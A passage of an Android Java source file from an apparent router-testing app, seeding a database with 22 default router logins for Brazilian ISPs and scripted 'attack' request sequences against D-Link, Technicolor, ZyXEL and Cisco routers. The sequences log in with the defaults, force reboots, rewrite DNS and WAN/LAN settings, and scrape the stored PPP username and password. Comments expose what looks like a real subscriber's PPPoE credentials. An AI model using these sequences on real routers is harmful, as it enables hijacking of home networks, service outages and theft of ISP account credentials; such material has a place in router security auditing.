package br.pedrofreitas.myroutertestapp.dao;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import br.pedrofreitas.myroutertestapp.manager.Ataque;
import br.pedrofreitas.myroutertestapp.manager.Login;
import br.pedrofreitas.myroutertestapp.manager.Params;
import br.pedrofreitas.myroutertestapp.manager.PostGet;

public class Initialize {
	
	private Context mContext;

	private SharedPreferences mShared;
	private String TAG_CREATE_TABLES = "isCreated";
	
	private GeneralDao mGeneralDao;
	private DadoDao mDadoDao;
	private AtaqueDao mAtaqueDao;
	private PostGetDao mPostGetDao;
	private ParamsDao mParamsDao;
	private UsuarioDao mUsuarioDao;
	
	
	public Initialize(Context mContext, SharedPreferences mShared) {
		this.mContext = mContext;
		this.mShared = mShared;
	}
	
	public void start() {
		mGeneralDao = new GeneralDao(mContext);
		mDadoDao = new DadoDao(mContext);
		mAtaqueDao = new AtaqueDao(mContext);
		mPostGetDao = new PostGetDao(mContext);
		mParamsDao = new ParamsDao(mContext);         
		mUsuarioDao = new UsuarioDao(mContext);		

		SharedPreferences.Editor editor = mShared.edit();
		editor.putBoolean(TAG_CREATE_TABLES, true);
		editor.commit();

		Log.i("CREATE_TABLES", "Tabelas criadas com sucesso");
		
		/*****PARA TESTE COMENTAR******/
		insertAll();
		selectAll();
		/******************************/
	}

	public void insertAll() {	
		mUsuarioDao.insert(new Login(1, "super", "@c&essoO1", "oi"));
		mUsuarioDao.insert(new Login(2, "admin", "admin", "oi"));
		mUsuarioDao.insert(new Login(3, "zqf5nw2x", "10931030", "net"));
		mUsuarioDao.insert(new Login(4, "", "admin", "oi"));
		mUsuarioDao.insert(new Login(5, "admin", "1234", "oi"));
		mUsuarioDao.insert(new Login(6, "admin", "gvt12345", "gvt"));
		mUsuarioDao.insert(new Login(7, "admin", "motorola", "net"));
		mUsuarioDao.insert(new Login(8, "router", "router", "net"));
		mUsuarioDao.insert(new Login(9, "cablecom", "router", "net"));
		mUsuarioDao.insert(new Login(10, "", "admin", "oi"));
		mUsuarioDao.insert(new Login(11, "", "Wireless", "oi"));
		mUsuarioDao.insert(new Login(12, "Admin", "Admin", "oi"));
		mUsuarioDao.insert(new Login(13, "Admin", "", "oi"));
		mUsuarioDao.insert(new Login(14, "", "Admin", "oi"));
		mUsuarioDao.insert(new Login(15, "Administrator", "Administrator", "oi"));
		mUsuarioDao.insert(new Login(16, "Administrator", "", "oi"));
		mUsuarioDao.insert(new Login(17, "", "Adminstrator", "oi"));
		mUsuarioDao.insert(new Login(18, "root", "root", "oi"));
		mUsuarioDao.insert(new Login(19, "root", "", "oi"));
		mUsuarioDao.insert(new Login(20, "", "root", "oi"));
		mUsuarioDao.insert(new Login(21, "admin", "password", "net"));
		mUsuarioDao.insert(new Login(22, "", "1234", "oi"));
	
		/*******************************************************Start Login*******************************************************/
//		GVT D-Link DSL-2640B	
		mAtaqueDao.insert(new Ataque(1, "login", "gvt", 0, "D-Link DSL-2640B"));
			mPostGetDao.insert(new PostGet(1, 1, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(2, 1, 2, "get", "/logo.html", "logoBody", 1));
			mPostGetDao.insert(new PostGet(3, 1, 3, "get", "/menu.html", "mainMenuBody", 1));
			mPostGetDao.insert(new PostGet(4, 1, 4, "get", "/info.html", "DSL-2640B", 1));
		
//		Oi technicolor TD5136v2 / TD5130v2	
		mAtaqueDao.insert(new Ataque(2, "login", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
			mPostGetDao.insert(new PostGet(5, 2, 1, "post", "/login.cgi", "/index.cgi", 1));		
				mParamsDao.insert(new Params(1, 5, "isSubmit", "1"));
				mParamsDao.insert(new Params(2, 5, "username", "insereUsuario"));
				mParamsDao.insert(new Params(3, 5, "password", "insereSenha"));			
			mPostGetDao.insert(new PostGet(6, 2, 2, "get", "/index.cgi", "ADSL Router Webserver", 0));
			mPostGetDao.insert(new PostGet(7, 2, 3, "get", "/top.cgi", "Welcome to WEB Configuration", 0));	
			mPostGetDao.insert(new PostGet(8, 2, 4, "get", "/code.cgi", "SETUP WIZARD", 0));	
			mPostGetDao.insert(new PostGet(9, 2, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));	
	
//		Oi ZyXEL AMG1202-T10B
		mAtaqueDao.insert(new Ataque(3, "login", "oi", 1, "ZyXEL AMG1202-T10B"));			
			mPostGetDao.insert(new PostGet(10, 3, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
				mParamsDao.insert(new Params(4, 10, "LoginPassword", "insereSenha"));
				mParamsDao.insert(new Params(5, 10, "LoginUsername", "insereUsuario"));
			mPostGetDao.insert(new PostGet(11, 3, 2, "get", "/MakeSession.asp", "", 0));	
			mPostGetDao.insert(new PostGet(12, 3, 3, "get", "/cgi-bin/Jump2Host.asp", "", 0));
			mPostGetDao.insert(new PostGet(13, 3, 4, "get", "/cgi-bin/rpSys.asp", "ZyXEL Prestige", 0));		
			mPostGetDao.insert(new PostGet(14, 3, 5, "get", "/cgi-bin/top.asp", "", 0));		
			mPostGetDao.insert(new PostGet(15, 3, 6, "get", "/cgi-bin/path.asp", "", 0));		
			mPostGetDao.insert(new PostGet(16, 3, 7, "get", "/cgi-bin/home.asp", "Home", 0));		
			mPostGetDao.insert(new PostGet(17, 3, 8, "get", "/cgi-bin/rpPanel.asp", "", 0));		
			mPostGetDao.insert(new PostGet(18, 3, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(19, 3, 10, "get", "/cgi-bin/path.asp", "", 0));
		
//		NET Cisco DPC3925
		mAtaqueDao.insert(new Ataque(4, "login", "net", 1, "Cisco DPC3925"));			
			mPostGetDao.insert(new PostGet(20, 4, 1, "post", "/goform/Docsis_system", "Setup", 1));														
				mParamsDao.insert(new Params(6, 20, "username_login", "insereUsuario"));
				mParamsDao.insert(new Params(7, 20, "password_login", "insereSenha"));
				mParamsDao.insert(new Params(8, 20, "LanguageSelect", "en"));
				mParamsDao.insert(new Params(9, 20, "Language_Submit", "0"));
				mParamsDao.insert(new Params(10, 20, "login", "Log In"));
			mPostGetDao.insert(new PostGet(21, 4, 2, "get", "/Quick_setup.asp", "Setup", 0));
	
		/********************************************************End Login********************************************************/
			
			
		/******************************************************Start Reboot*******************************************************/	
//		GVT D-Link DSL-2640B
		mAtaqueDao.insert(new Ataque(5, "reboot", "gvt", 0, "D-Link DSL-2640B"));
			mPostGetDao.insert(new PostGet(22, 5, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(23, 5, 2, "get", "/logo.html", "logoBody", 1));
			mPostGetDao.insert(new PostGet(24, 5, 3, "get", "/menu.html", "mainMenuBody", 1));
			mPostGetDao.insert(new PostGet(25, 5, 4, "get", "/info.html", "DSL-2640B", 1));
			mPostGetDao.insert(new PostGet(26, 5, 5, "get", "/backupsettings.html", "", 1));
			mPostGetDao.insert(new PostGet(27, 5, 6, "get", "/resetrouter.html", "", 1));
			mPostGetDao.insert(new PostGet(28, 5, 7, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));
	
//		Oi technicolor TD5136v2 / TD5130v2	
		mAtaqueDao.insert(new Ataque(6, "reboot", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
			mPostGetDao.insert(new PostGet(29, 6, 1, "post", "/login.cgi", "/index.cgi", 1));		
				mParamsDao.insert(new Params(11, 29, "isSubmit", "1"));
				mParamsDao.insert(new Params(12, 29, "username", "insereUsuario"));
				mParamsDao.insert(new Params(13, 29, "password", "insereSenha"));			
			mPostGetDao.insert(new PostGet(30, 6, 2, "get", "/index.cgi", "ADSL Router Webserver", 0));
			mPostGetDao.insert(new PostGet(31, 6, 3, "get", "/top.cgi", "Welcome to WEB Configuration", 0));	
			mPostGetDao.insert(new PostGet(32, 6, 4, "get", "/code.cgi", "SETUP WIZARD", 0));	
			mPostGetDao.insert(new PostGet(33, 6, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));	
			mPostGetDao.insert(new PostGet(34, 6, 6, "get", "/reboot.cgi", "want to reboot the device", 0));	
			mPostGetDao.insert(new PostGet(35, 6, 7, "post", "/reboot.cgi", "System rebooting", 0));
				mParamsDao.insert(new Params(14, 35, "submitValue", "redirect"));						
			mPostGetDao.insert(new PostGet(36, 6, 8, "post", "/reboot.cgi", "", 0));		////TIMEOUT	
				mParamsDao.insert(new Params(15, 36, "submitValue", "apply"));
	
//		Oi ZyXEL AMG1202-T10B
		mAtaqueDao.insert(new Ataque(7, "reboot", "oi", 1, "ZyXEL AMG1202-T10B"));			
			mPostGetDao.insert(new PostGet(37, 7, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
				mParamsDao.insert(new Params(16, 37, "LoginPassword", "insereSenha"));
				mParamsDao.insert(new Params(17, 37, "LoginUsername", "insereUsuario"));
			mPostGetDao.insert(new PostGet(38, 7, 2, "get", "/MakeSession.asp", "", 0));	
			mPostGetDao.insert(new PostGet(39, 7, 3, "get", "/cgi-bin/Jump2Host.asp", "", 0));
			mPostGetDao.insert(new PostGet(40, 7, 4, "get", "/cgi-bin/rpSys.asp", "ZyXEL Prestige", 0));		
			mPostGetDao.insert(new PostGet(41, 7, 5, "get", "/cgi-bin/top.asp", "", 0));		
			mPostGetDao.insert(new PostGet(42, 7, 6, "get", "/cgi-bin/path.asp", "", 0));		
			mPostGetDao.insert(new PostGet(43, 7, 7, "get", "/cgi-bin/home.asp", "Home", 0));		
			mPostGetDao.insert(new PostGet(44, 7, 8, "get", "/cgi-bin/rpPanel.asp", "", 0));		
			mPostGetDao.insert(new PostGet(45, 7, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(46, 7, 10, "get", "/cgi-bin/rpFWUpload.asp", "Firmware Version", 0));		
			mPostGetDao.insert(new PostGet(47, 7, 11, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(48, 7, 12, "get", "/cgi-bin/rpSysReboot.asp", "want to restart", 0));
			mPostGetDao.insert(new PostGet(49, 7, 13, "get", "/cgi-bin/buttom.asp", "", 0));
			mPostGetDao.insert(new PostGet(50, 7, 14, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));			
	
//		NET Cisco DPC3925
		mAtaqueDao.insert(new Ataque(8, "reboot", "net", 1, "Cisco DPC3925"));			
			mPostGetDao.insert(new PostGet(51, 8, 1, "post", "/goform/Docsis_system", "Setup", 1));														
				mParamsDao.insert(new Params(18, 51, "username_login", "insereUsuario"));
				mParamsDao.insert(new Params(19, 51, "password_login", "insereSenha"));
				mParamsDao.insert(new Params(20, 51, "LanguageSelect", "en"));
				mParamsDao.insert(new Params(21, 51, "Language_Submit", "0"));
				mParamsDao.insert(new Params(22, 51, "login", "Log In"));
			mPostGetDao.insert(new PostGet(52, 8, 2, "get", "/Quick_setup.asp", "Quick Setup", 0));
			mPostGetDao.insert(new PostGet(53, 8, 3, "get", "/Administration.asp", "Management", 0));
			mPostGetDao.insert(new PostGet(54, 8, 4, "get", "/Devicerestart.asp", "Device Restart", 0));
			mPostGetDao.insert(new PostGet(55, 8, 5, "post", "/goform/Devicerestart", "", 1));														
				mParamsDao.insert(new Params(23, 55, "devicerestrat_Password_check", "insereSenha"));
				mParamsDao.insert(new Params(24, 55, "mtenRestore", "Device Restart"));
				mParamsDao.insert(new Params(25, 55, "devicerestart", "1"));
				mParamsDao.insert(new Params(26, 55, "devicerestrat_getUsercheck", "true"));
			mPostGetDao.insert(new PostGet(56, 8, 6, "get", "/index.asp", "", 0));
	
		/*******************************************************End Reboot********************************************************/	
			
			
		/********************************************************Start DNS********************************************************/	
//		GVT D-Link DSL-2640B
		mAtaqueDao.insert(new Ataque(9, "dns", "gvt", 0, "D-Link DSL-2640B"));
			mPostGetDao.insert(new PostGet(57, 9, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(58, 9, 2, "get", "/logo.html", "logoBody", 1));
			mPostGetDao.insert(new PostGet(59, 9, 3, "get", "/menu.html", "mainMenuBody", 1));
			mPostGetDao.insert(new PostGet(60, 9, 4, "get", "/info.html", "DSL-2640B", 1));
			mPostGetDao.insert(new PostGet(61, 9, 5, "get", "/dslatm.cmd", "", 1));
			mPostGetDao.insert(new PostGet(62, 9, 6, "get", "/dnscfg.html", "interfaceInfo", 1));
			mPostGetDao.insert(new PostGet(63, 9, 7, "get", "/dnscfg.cgi?dnsPrimary=8.8.8.8&dnsSecondary=8.8.4.4&dnsIfc=&dnsRefresh=1", "8.8.8.8", 1));
			mPostGetDao.insert(new PostGet(64, 9, 8, "get", "/dnscfg.cgi?dnsRefresh=0", "", 1));
			mPostGetDao.insert(new PostGet(65, 9, 9, "get", "/backupsettings.html", "", 1));
			mPostGetDao.insert(new PostGet(66, 9, 10, "get", "/resetrouter.html", "", 1));
			mPostGetDao.insert(new PostGet(67, 9, 11, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));
			
//		Oi technicolor TD5136v2	/ TD5130v2	
		mAtaqueDao.insert(new Ataque(10, "dns", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
			mPostGetDao.insert(new PostGet(68, 10, 1, "post", "/login.cgi", "/index.cgi", 1));		
				mParamsDao.insert(new Params(27, 68, "isSubmit", "1"));
				mParamsDao.insert(new Params(28, 68, "username", "insereUsuario"));
				mParamsDao.insert(new Params(29, 68, "password", "insereSenha"));			
			mPostGetDao.insert(new PostGet(69, 10, 2, "get", "/index.cgi", "ADSL Router Webserver", 0));
			mPostGetDao.insert(new PostGet(70, 10, 3, "get", "/top.cgi", "Welcome to WEB Configuration", 0));	
			mPostGetDao.insert(new PostGet(71, 10, 4, "get", "/code.cgi", "SETUP WIZARD", 0));	
			mPostGetDao.insert(new PostGet(72, 10, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));
			mPostGetDao.insert(new PostGet(73, 10, 6, "get", "/wancfg.cgi?tAction=view&idx=0", "document.tF_DSL.Profile_Name.value = \"(.*?)\";;" +
																							   "document.tF_DSL.DSL_AutoPVCEnabled.value = \"(.*?)\";;" +
																							   "document.tF_DSL.DSL_VPI.value = \"(.*?)\";;" +
																							   "document.tF_DSL.DSL_VCI.value = \"(.*?)\";;" +
																							   "document.tF_DSL.DSL_Encapsulation.value=\"(.*?)\";;" +
																							   "document.tF_DSL.DSL_ATMQoS.value = \"(.*?)\";;" +
																							   "document.tF_DSL.DSL_ATMPeakCellRate.value=\"(.*?)\";;" +
																							   "document.tF_DSL.PPP_Enable.value = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_Name.value = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_NATEnabled.value = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_UserName.value = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_UserPassword.value = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_ConfirmPassword.value = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_MaxMRUSize.value = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_PPPoEServiceName.value = \"(.*?)\";;" +
																							   "Lan_Mac = \"(.*?)\";;" +
																							   "document.tF_DSL.PPP_LCP_Interval.value=\"(.*?)\";;" +
																							   "document.tF_DSL.IP_Enable.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_Name.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_NATEnabled.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_AddressingType.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_MaxMTUSize.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_Option_125.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_Option_60_Vendor_ID.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_Option_61_IAID.value = \"(.*?)\";;" +
																							   "document.tF_DSL.IP_Option_61_DUID.value = \"(.*?)\";;", 0));
			mPostGetDao.insert(new PostGet(74, 10, 7, "get", "/wancfg.cgi?tAction=apply&idx=0" +
																						"&natEnable=1" +
																						"&defaultRoute=1" +
																						"&icmpReply=0" +
																						"&proxyArp=0" +
																						"&dnsEnable=1" +
																						"&dns1=8.8.8.8" +
																						"&dns2=8.8.4.4" +
																						"&PPP_ConnectionTrigger_value=0" +
																						"&dnsOveride=0" +
																						"&state=1" +
																						"&ipVer=0" +
																						"&ipMode=1" +
																						"&srvName=WAN1" +
																						"&wanIpAddr=0.0.0.0" +
																						"&wanSubnet=0.0.0.0" +
																						"&wanMode=1" +
																						"&wanMac=" +
																						"&unnumberMode=0" +
																						"&Profile_Name=inseredocument.tF_DSL.Profile_Name.value" +		//PVC0
																						"&pvcId=0" +
																						"&DSL_Enable=1" +
																						"&DSL_AutoPVCEnabled=inseredocument.tF_DSL.DSL_AutoPVCEnabled.value" +		//1
																						"&DSL_VPI=inseredocument.tF_DSL.DSL_VPI.value" +		//0
																						"&DSL_VCI=inseredocument.tF_DSL.DSL_VCI.value" +		//33
																						"&DSL_LinkType=0" +
																						"&DSL_Encapsulation=inseredocument.tF_DSL.DSL_Encapsulation.value" +		//1
																						"&DSL_ATMQoS=inseredocument.tF_DSL.DSL_ATMQoS.value" +		//0
																						"&DSL_ATMPeakCellRate=inseredocument.tF_DSL.DSL_ATMPeakCellRate.value" +		//6000
																						"&DSL_ATMMaxmumBurstSize=0" +
																						"&DSL_ATMSustainableCellRate=0" +
																						"&DSL_EnableVlan=0" +
																						"&DSL_DefaultVlanID=-1" +
																						"&DSL_DefaultPriority=-1" +
																						"&bridgeType=2" +
																						"&igmpEnabled=0" +
																						"&mode=1" +
																						"&PPP_Enable=inseredocument.tF_DSL.PPP_Enable.value" +		//1
																						"&PPP_IPversion=0" +
																						"&PPP_IPMode=1" +
																						"&PPP_IPAddress=0.0.0.0" +
																						"&PPP_Name=inseredocument.tF_DSL.PPP_Name.value" +		//WAN1
																						"&PPP_NATEnabled=inseredocument.tF_DSL.PPP_NATEnabled.value" +		//1
																						"&PPP_UserName=inseredocument.tF_DSL.PPP_UserName.value" +		//B0C287467712@oivelox
																						"&PPP_UserPassword=inseredocument.tF_DSL.PPP_UserPassword.value" +		//B0C287467712
																						"&PPP_ConfirmPassword=inseredocument.tF_DSL.PPP_ConfirmPassword.value" +		//B0C287467712
																						"&PPP_MaxMRUSize=inseredocument.tF_DSL.PPP_MaxMRUSize.value" +		//1492
																						"&PPP_DNSEnabled=1" +
																						"&PPP_DNSOverrideAllowed=0" +
																						"&PPP_DNSServer1=8.8.8.8" +
																						"&PPP_DNSServer2=8.8.4.4" +
																						"&PPP_PPPoEServiceName=inseredocument.tF_DSL.PPP_PPPoEServiceName.value" +		//
																						"&PPP_MACAddress1=insereLan_Mac0-2" +		//B0
																						"&PPP_MACAddress2=insereLan_Mac3-5" +		//C2
																						"&PPP_MACAddress3=insereLan_Mac6-8" +		//87
																						"&PPP_MACAddress4=insereLan_Mac9-11" +		//46
																						"&PPP_MACAddress5=insereLan_Mac12-14" +		//77
																						"&PPP_MACAddress6=insereLan_Mac15-17" +		//12
																						"&PPP_PPPoEACName=" +
																						"&PPP_LCP_Interval=inseredocument.tF_DSL.PPP_LCP_Interval.value" +		//10
																						"&PPP_DefaultRoute=0" +
																						"&IP_Enable=inseredocument.tF_DSL.IP_Enable.value" +		//1
																						"&IP_IPversion=0" +
																						"&IP_Name=inseredocument.tF_DSL.IP_Name.value" +
																						"&IP_ConnectionType=2" +
																						"&IP_NATEnabled=inseredocument.tF_DSL.IP_NATEnabled.value" +		//1
																						"&IP_AddressingType=inseredocument.tF_DSL.IP_AddressingType.value" +		//1
																						"&IP_ExternalIPAddress=0.0.0.0" +
																						"&IP_SubNetMask=0.0.0.0" +
																						"&IP_DefaultGateway=0.0.0.0" +
																						"&IP_DNSEnabled=0" +
																						"&IP_DNSOverrideAllowed=0" +
																						"&IP_MaxMTUSize=inseredocument.tF_DSL.IP_MaxMTUSize.value" +		//1492
																						"&IP_MACAddress1=insereLan_Mac0-2" +		//B0
																						"&IP_MACAddress2=insereLan_Mac3-5" +		//C2
																						"&IP_MACAddress3=insereLan_Mac6-8" +		//87
																						"&IP_MACAddress4=insereLan_Mac9-11" +		//46
																						"&IP_MACAddress5=insereLan_Mac12-14" +		//77
																						"&IP_MACAddress6=insereLan_Mac15-17" +		//12
																						"&IP_Option_125=inseredocument.tF_DSL.IP_Option_125.value" +		//0
																						"&IP_Option_60_Vendor_ID=inseredocument.tF_DSL.IP_Option_60_Vendor_ID.value" +		//
																						"&IP_Option_61_IAID=inseredocument.tF_DSL.IP_Option_61_IAID.value" +		//
																						"&IP_Option_61_DUID=inseredocument.tF_DSL.IP_Option_61_DUID.value" +		//
																						"&IP_DefaultRoute=0", "", 0));
			mPostGetDao.insert(new PostGet(75, 10, 8, "get", "/reboot.cgi", "want to reboot the device", 0));
			mPostGetDao.insert(new PostGet(76, 10, 9, "post", "/reboot.cgi", "System rebooting", 0));
			mParamsDao.insert(new Params(30, 76, "submitValue", "redirect"));						
			mPostGetDao.insert(new PostGet(77, 10, 10, "post", "/reboot.cgi", "", 0));		//TIMEOUT	
			mParamsDao.insert(new Params(31, 77, "submitValue", "apply"));
			
//		Oi ZyXEL AMG1202-T10B
		mAtaqueDao.insert(new Ataque(11, "dns", "oi", 1, "ZyXEL AMG1202-T10B"));			
			mPostGetDao.insert(new PostGet(78, 11, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
				mParamsDao.insert(new Params(32, 78, "LoginPassword", "insereSenha"));
				mParamsDao.insert(new Params(33, 78, "LoginUsername", "insereUsuario"));
			mPostGetDao.insert(new PostGet(79, 11, 2, "get", "/MakeSession.asp", "", 0));	
			mPostGetDao.insert(new PostGet(80, 11, 3, "get", "/cgi-bin/Jump2Host.asp", "", 0));
			mPostGetDao.insert(new PostGet(81, 11, 4, "get", "/cgi-bin/rpSys.asp", "ZyXEL Prestige", 0));		
			mPostGetDao.insert(new PostGet(82, 11, 5, "get", "/cgi-bin/top.asp", "", 0));		
			mPostGetDao.insert(new PostGet(83, 11, 6, "get", "/cgi-bin/path.asp", "", 0));		
			mPostGetDao.insert(new PostGet(84, 11, 7, "get", "/cgi-bin/home.asp", "Home", 0));		
			mPostGetDao.insert(new PostGet(85, 11, 8, "get", "/cgi-bin/rpPanel.asp", "", 0));		
			mPostGetDao.insert(new PostGet(86, 11, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(87, 11, 10, "get", "/cgi-bin/LAN_IP.asp", "", 0));		
			mPostGetDao.insert(new PostGet(88, 11, 11, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(89, 11, 12, "get", "/cgi-bin/LAN_DHCPSetup.asp", "<input type=\"hidden\" Name=\"IPAliasExist\" value=\"(.*?)\">;;" +
																							"<INPUT type=\"hidden\" NAME=\"IPAlias1Addr\" value=\"(.*?)\">;;" +
																							"<input type=\"hidden\" name=\"IPAlias1SubnetMask\" value=\"(.*?)\">;;" +																			
																							"<input type=\"text\" name=\"sysPoolStartingAddr\" size=\"15\" maxlength=\"15\" value=\"(.*?)\">;;" +
																							"<input type=\"hidden\" name=\"ipAddrMain\" value=\"(.*?)\">;;" + 
																							"<input type=\"hidden\" name=\"subnetMask\" value=\"(.*?)\">;;" +
																							"<input type=\"text\" name=\"sysPoolCount\" size=\"3\" maxlength=\"3\" value=\"(.*?)\" onKeyPress=\"chk_num\\(event\\)\">;;" +
																							"<input type=\"hidden\" name=\"DNSproxy\" value=\"(.*?)\">;;", 0));
			mPostGetDao.insert(new PostGet(90, 11, 13, "get", "/cgi-bin/buttom.asp", "", 0));
			mPostGetDao.insert(new PostGet(91, 11, 14, "post", "/cgi-bin/LAN_DHCPSetup.asp", "", 0));											
				mParamsDao.insert(new Params(34, 91, "IPAliasExist", "insereIPAliasExist"));		//Yes	
				mParamsDao.insert(new Params(35, 91, "IPAlias1Addr", "insereIPAlias1Addr"));		//192.168.2.1										
				mParamsDao.insert(new Params(36, 91, "IPAlias1SubnetMask", "insereIPAlias1SubnetMask"));		//255.255.255.0	
				mParamsDao.insert(new Params(37, 91, "DNSdefaultValue1", "168.95.1.1"));												
				mParamsDao.insert(new Params(38, 91, "DNSdefaultValue2", "168.95.1.2"));	
				mParamsDao.insert(new Params(39, 91, "DHCP_Mode", "1"));	
				mParamsDao.insert(new Params(40, 91, "sysPoolStartingAddr", "inseresysPoolStartingAddr"));		//192.168.1.33
				mParamsDao.insert(new Params(41, 91, "ipAddrMain", "insereipAddrMain"));		//192.168.1.1	
				mParamsDao.insert(new Params(42, 91, "subnetMask", "inseresubnetMask"));		//255.2555.255.0		
				mParamsDao.insert(new Params(43, 91, "sysPoolCount", "inseresysPoolCount"));		//32	
				mParamsDao.insert(new Params(44, 91, "DNSproxyType", "1"));	
				mParamsDao.insert(new Params(45, 91, "DHCPPriDNSAddr", "8.8.8.8"));	
				mParamsDao.insert(new Params(46, 91, "DHCPSecDNSAddr", "8.8.4.4"));	
				mParamsDao.insert(new Params(47, 91, "DNSproxy", "insereDNSproxy"));		//Yes
				mParamsDao.insert(new Params(48, 91, "LAN_DHCPFlag", "1"));		
			mPostGetDao.insert(new PostGet(92, 11, 15, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(93, 11, 16, "get", "/cgi-bin/rpFWUpload.asp", "Firmware Version", 0));		
			mPostGetDao.insert(new PostGet(94, 11, 17, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(95, 11, 18, "get", "/cgi-bin/rpSysReboot.asp", "want to restart", 0));
			mPostGetDao.insert(new PostGet(96, 11, 19, "get", "/cgi-bin/buttom.asp", "", 0));
			mPostGetDao.insert(new PostGet(97, 11, 20, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));			

//		NET Cisco DPC3925			
		mAtaqueDao.insert(new Ataque(12, "dns", "net", 1, "Cisco DPC3925"));			
			mPostGetDao.insert(new PostGet(98, 12, 1, "post", "/goform/Docsis_system", "Setup", 1));														
				mParamsDao.insert(new Params(49, 98, "username_login", "insereUsuario"));
				mParamsDao.insert(new Params(50, 98, "password_login", "insereSenha"));
				mParamsDao.insert(new Params(51, 98, "LanguageSelect", "en"));
				mParamsDao.insert(new Params(52, 98, "Language_Submit", "0"));
				mParamsDao.insert(new Params(53, 98, "login", "Log In"));
			mPostGetDao.insert(new PostGet(99, 12, 2, "get", "/Quick_setup.asp", "Quick Setup", 0));
			mPostGetDao.insert(new PostGet(100, 12, 3, "get", "/LanSetup.asp", "<input name=\"CiscoLocalIpAddressIP2\" title=\"Local IP Address Third Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />;;" +
																				"<input name=\"CiscoLocalIpAddressIP3\" title=\"Local IP Address Fourth Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />;;" +
																				"<input name=\"CiscoLocalNetmaskIP3\" title=\"Subnet Mask Fourth Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />;;" +
																				"<input type=\"hidden\" name=\"CiscoIsLocalIPSettingByGUI\" value=\"(.*?)\" />;;" +
																				"<input type=\"hidden\" name=\"CiscoIsDefaultIP\" value=\"(.*?)\" />;;" +
																				"<input type=\"text\" id=\"CiscoStartingLocalAddressIP3\" name=\"CiscoStartingLocalAddressIP3\" size=\"3\" maxlength=\"3\" class=\"ipnum\" value=\"(.*?)\" />;;" +
																				"<input type=\"text\" id=\"CiscoNumberOfCpes\" name=\"CiscoNumberOfCpes\" class=\"num\" size=\"3\" maxlength=\"3\" value=\"(.*?)\" />;;" +
																				"<input type=\"text\" id=\"CiscoLeaseTime\" name=\"CiscoLeaseTime\" class=\"num\" maxlength=\"4\" size=\"4\" value=\"(.*?)\" />;;" +
																				"<input type=\"text\" id=\"DaylightSavingMinutes\" name=\"DaylightSavingMinutes\" class=\"num\" maxlength=\"4\" size=\"4\" value=\"(.*?)\" />;;" +
																				"<INPUT name=\"h_DaylightSavingEnable\" type=\"hidden\" value=\"(.*?)\" />;;" +
																				"<INPUT name=\"NewNtpTimeServer\" id=\"NewNtpTimeServer\" value=\"(.*?)\" />;;" +
																				"<INPUT name=\"addNtpServer\" type=\"hidden\" value=\"(.*?)\" />;;" +
																				"<INPUT name=\"removeNtpServer\" type=\"hidden\" value=\"(.*?)\" />;;" +
																				"<INPUT name=\"TimeSntpEnable\" id=\"TimeSntpEnable\" type=\"radio\" value=\"(.*?)\";;", 0));
			mPostGetDao.insert(new PostGet(101, 12, 4, "post", "/goform/LanSetup", "", 0));														
				mParamsDao.insert(new Params(54, 101, "CiscoLocalIpAddressIP2", "insereCiscoLocalIpAddressIP2"));		//0
				mParamsDao.insert(new Params(55, 101, "CiscoLocalIpAddressIP3", "insereCiscoLocalIpAddressIP3"));		//1		
				mParamsDao.insert(new Params(56, 101, "CiscoLocalNetmaskIP3", "insereCiscoLocalNetmaskIP3"));		//0
				mParamsDao.insert(new Params(57, 101, "CiscoIsLocalIPSettingByGUI", "insereCiscoIsLocalIPSettingByGUI"));		//1
				mParamsDao.insert(new Params(58, 101, "CiscoIsDefaultIP", "insereCiscoIsDefaultIP"));		//1
				mParamsDao.insert(new Params(59, 101, "CiscoDhcpServer", "1"));		
				mParamsDao.insert(new Params(60, 101, "CiscoStartingLocalAddressIP2", "0"));		
				mParamsDao.insert(new Params(61, 101, "CiscoStartingLocalAddressIP3", "insereCiscoStartingLocalAddressIP3"));		//10
